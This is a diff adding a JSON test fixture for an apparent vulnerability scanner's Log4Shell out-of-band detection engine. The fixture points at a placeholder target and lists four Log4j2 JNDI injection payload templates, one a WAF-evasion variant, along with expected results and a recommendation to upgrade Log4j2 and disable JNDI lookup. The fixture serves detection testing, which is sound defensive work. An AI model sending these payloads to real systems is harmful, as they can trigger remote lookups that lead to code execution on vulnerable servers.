@@ -1,0 +1,20 @@
+{
+  "engine": "framework_zero_day_engines._run_oob_scan",
+  "kwargs": {
+    "engine_name": "log4shell",
+    "url": "https://target.example/a",
+    "param": "p",
+    "parsed_query": "p=x",
+    "payload_templates": [
+      "${jndi:dns://{OBS_DNS}}",
+      "${jndi:ldap://{OBS_DNS}/a}",
+      "${jndi:rmi://{OBS_DNS}/a}",
+      "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{OBS_DNS}/a}"
+    ],
+    "type_label": "Log4j2 JNDI 注入",
+    "evidence_note": "注入 ${jndi:*}(含 WAF 绕过变体)后命中 OOB(触发服务端 JNDI 查询)",
+    "recommendation": "升级 Log4j2 至 2.17.1+，禁用 JNDI Lookup",
+    "oob_wait": 1
+  },
+  "expected": {"not_none": true, "type": "Log4j2 JNDI 注入(带外实锤)"}
+}
